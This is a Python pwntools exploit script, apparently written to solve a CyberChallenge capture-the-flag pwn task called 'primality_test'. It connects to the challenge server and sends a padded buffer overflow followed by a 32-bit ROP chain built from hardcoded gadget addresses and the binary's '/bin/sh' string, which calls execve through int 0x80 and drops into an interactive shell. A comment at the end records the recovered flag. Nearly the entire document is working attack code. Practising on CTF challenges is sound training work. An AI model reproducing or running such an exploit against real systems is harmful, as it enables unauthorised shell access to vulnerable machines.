from pwn import *

exe = ELF("primality_test")
context.binary = exe
HOST = "rop.challs.cyberchallenge.it"
PORT = 9130
p = remote(HOST, PORT)

POP_EAX_INT = 0x08048606
POP_EBX_ECX = 0x08048609
POP_ECX = 0x0804860a
POP_EDX = 0x0804860c
BIN_SH = next(exe.search(b'/bin/sh\x00'))  # find in the memory the address of "/bin/sh"
# I build the ROPchain with the addresses found previously
chain = fit(
    b'a' * (0x4c + 4),
    p32(POP_EBX_ECX),
    p32(BIN_SH),
    p32(0),
    p32(POP_EDX),
    p32(0),
    p32(POP_EAX_INT),
    p32(11)
)
p.sendlineafter("Enter a number: ", chain)
p.recvuntil("number!\n")
p.interactive()

# FLAG --> CCIT{c0d3_r3U5e_FtW}
